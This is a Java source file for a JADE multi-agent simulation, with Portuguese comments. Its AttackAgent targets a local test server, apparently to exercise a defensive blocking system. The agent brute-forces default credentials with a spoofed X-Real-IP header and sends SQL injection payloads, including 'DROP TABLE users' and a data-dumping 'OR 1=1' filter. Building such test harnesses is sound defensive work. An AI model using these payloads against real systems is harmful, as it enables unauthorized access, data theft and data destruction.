package agentes;

import jade.core.Agent;
import jade.core.behaviours.TickerBehaviour;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import jade.lang.acl.ACLMessage;
import jade.lang.acl.MessageTemplate;

import jade.domain.DFService;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.domain.FIPAException;
import jade.domain.FIPANames;

import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;

import java.io.BufferedReader;
import java.io.InputStreamReader;



public class AttackAgent extends Agent {

    private boolean notifiedCreate = false;

    private static final String[] USERNAMES = {"admin", "root", "user", "test"};
    private static final String[] PASSWORDS = {"1234", "password", "admin", "root"};

    // Códigos ANSI para cor
    public static final String RESET = "\u001B[0m";
    public static final String VERMELHO = "\u001B[31m";
    public static final String VERDE = "\u001B[32m";
    public static final String AMARELO = "\u001B[33m";
    public static final String AZUL = "\u001B[34m";
    public static final String CIANO = "\u001B[36m";

    private String generateAttackIp() {
        int part3 = (int)(Math.random() * 256);
        int part4 = (int)(Math.random() * 256);
        return "10.0." + part3 + "." + part4;
    }

    protected void setup(){
        String fakeIp = generateAttackIp();
        int tipoAtaque = (int)(Math.random() * 2);
        if(tipoAtaque == 0){
            System.out.println(getLocalName() + ": Tipo selecionado = Injection");
            addBehaviour(new InjectionBehaviour(this, 1000, fakeIp));

        }
        else if(tipoAtaque == 1){
            System.out.println(getLocalName() + ": Tipo selecionado = DoS");
            addBehaviour(new DosBehaviour(this, 300, fakeIp));
        }
    }

//----------------------------------------------------------------------------------------------------------------------------------

    private class DosBehaviour extends TickerBehaviour {
        private final String fakeIp;
        private final Random rnd = new Random();

        public DosBehaviour(Agent a, long period, String fakeIp) {
            super(a, period);
            this.fakeIp = fakeIp;
        }

        protected void onTick() {
                try {
                    String user = USERNAMES[rnd.nextInt(USERNAMES.length)];
                    String pass = PASSWORDS[rnd.nextInt(PASSWORDS.length)];

                    /* Formatação do json */
                    String json = String.format(
                        "{\"username\":\"%s\",\"password\":\"%s\"}", user, pass);

                    URL url = new URL("http://localhost:8080/");
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("POST");
                    con.setRequestProperty("Content-Type", "application/json");
                    con.setRequestProperty("X-Real-IP", fakeIp);
                    con.setDoOutput(true);

                    /*  escreve o JSON no corpo                                     */
                    try (OutputStream os = con.getOutputStream()) {
                        os.write(json.getBytes(StandardCharsets.UTF_8));
                    }

                    int code = con.getResponseCode();
                    System.out.printf("[ATTACK] %s --> %d (%s:%s)%n",
                                    getLocalName(), code, user, pass);

                    if(code == 403){    // Foi bloqueado
                        doDelete();
                    }
                } catch (Exception e) {
                    System.err.println("[ATTACK] erro: " + e);
                    doDelete();
                }
        }
    }

//----------------------------------------------------------------------------------------------------------------------------------

    private class InjectionBehaviour extends TickerBehaviour {
            private final String fakeIp;  
            private final Random rnd = new Random();

        public InjectionBehaviour(Agent a, long period, String fakeIp) {
            super(a, period);
            this.fakeIp = fakeIp;
        }
        protected void onTick() {
            int type = (int)(Math.random() * 2);    // Usado por enquanto para decidir se o SQLInjection vai tentar burlar o login ou "roubar" o banco de dados
            if(type == 2){
                try {
                    /*  payloads maliciosos */
                    String[] payloads = {
                        "admin' --",
                        "' OR '1'='1",
                        "'; DROP TABLE users; --",
                        "' UNION SELECT null,null --",
                        "' OR 1=1#"
                    };
                    String inj = payloads[rnd.nextInt(payloads.length)];

                    /*  monta JSON com o username = payload injetado */
                    String json = String.format(
                        "{\"username\":\"%s\",\"password\":\"malicioso\"}",
                        inj.replace("\"", "\\\"") 
                    );

                    URL url = new URL("http://localhost:8080/");
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("POST");
                    con.setRequestProperty("Content-Type", "application/json");
                    con.setRequestProperty("X-Real-IP", fakeIp);   
                    con.setDoOutput(true);

                    /*  envia corpo JSON */
                    try (OutputStream os = con.getOutputStream()) {
                        os.write(json.getBytes(StandardCharsets.UTF_8));
                    }

                    int code = con.getResponseCode();
                    if (code == 200){   // A Requisição foi recebida pela rota
                        System.out.printf(AMARELO + "[INJECTION] %s -> %d (%s)%n",
                        getAgent().getLocalName(), code, inj + RESET);
                    }
                    else{
                        System.out.printf(VERMELHO + "[INJECTION] %s -> %d (%s)%n",
                        getAgent().getLocalName(), code, inj + RESET);
                    }
                    

                    /*  se bloqueado, encerra o agente */
                    if (code == 403 || code == 429) {
                        System.out.println(VERMELHO + "[INJECTION] Bloqueado. Encerrando agente." + RESET);
                        doDelete();
                    }

                } catch (Exception e) {
                    System.err.printf(VERMELHO + "[INJECTION] erro: %s%n", e.getMessage() + RESET);
                    doDelete();
                }
            }
            else{
                try {
                /* payload para roubar os dados do banco de dados  */
                String inj = "%' OR 1=1 --";

                String json = String.format("{\"filter\":\"%s\"}",
                                            inj.replace("\"", "\\\""));

                URL url = new URL("http://localhost:8080/search_user"); // A forma de receber o payload tem que ser diferente então estou usando uma outra rota
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("X-Real-IP", fakeIp);
                con.setDoOutput(true);

                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                /* lê resposta e imprime credenciais roubadas */
                try (BufferedReader br = new BufferedReader(
                        new InputStreamReader(con.getInputStream()))) {

                    System.out.println(CIANO + "=== Dados vazados pelo SQLi ===" + AMARELO);
                    br.lines().forEach(System.out::println);
                    System.out.println(CIANO + "=== Fim do vazamento ===\n" + RESET);
                    doDelete();
                }

                } catch (Exception e) {
                    System.err.println("[INJECTION] erro: " + e.getMessage());
                    doDelete();
                }
            }
        }
    }
    
//----------------------------------------------------------------------------------------------------------------------------------
    
    protected void takeDown() {
    if (!notifiedCreate) {
        notifiedCreate = true;
        System.out.println("[ATTACK] " + getLocalName() + " sendo encerrado. Enviando mensagem ao CreateAttackAgent.");

        try {
            DFAgentDescription template = new DFAgentDescription();
            ServiceDescription sd = new ServiceDescription();
            sd.setType("Create-Attack");
            template.addServices(sd);

            DFAgentDescription[] result = DFService.search(this, template);
            if (result.length > 0) {
                ACLMessage msg = new ACLMessage(ACLMessage.REQUEST);
                msg.addReceiver(result[0].getName());
                msg.setProtocol(FIPANames.InteractionProtocol.FIPA_REQUEST);
                msg.setContent("criar");
                send(msg);
                System.out.println("[ATTACK] Mensagem enviada ao CreateAttackAgent.");
            } else {
                System.out.println("[ATTACK] Nenhum agente CreateAttackAgent encontrado.");
            }
        } catch (FIPAException e) {
            e.printStackTrace();
        }
        
    }
    return;
}

}





